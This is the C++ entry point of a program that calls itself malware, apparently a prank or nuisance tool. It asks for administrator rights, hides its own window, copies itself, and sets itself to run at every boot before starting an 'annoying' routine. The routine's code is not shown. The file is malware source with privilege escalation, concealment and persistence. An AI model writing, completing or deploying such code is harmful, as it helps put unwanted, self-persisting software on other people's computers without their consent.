#include "Main.h"
#include "Annoyer.h"
#include "Utils.h"
#include "Malware_behav.h"

int main()
{
	if (!is_running_as_admin()) {
		if (run_as_admin()) {
			exit(1);
		}
	}

#ifndef DEBUG_MODE
	hide_window();
#endif

	srand((unsigned int)time(NULL)); // Set random generator
	create_copy();
	config_run_at_boot();
	Annoyer* annoyer = new Annoyer();
	annoyer->start_annoying();
}
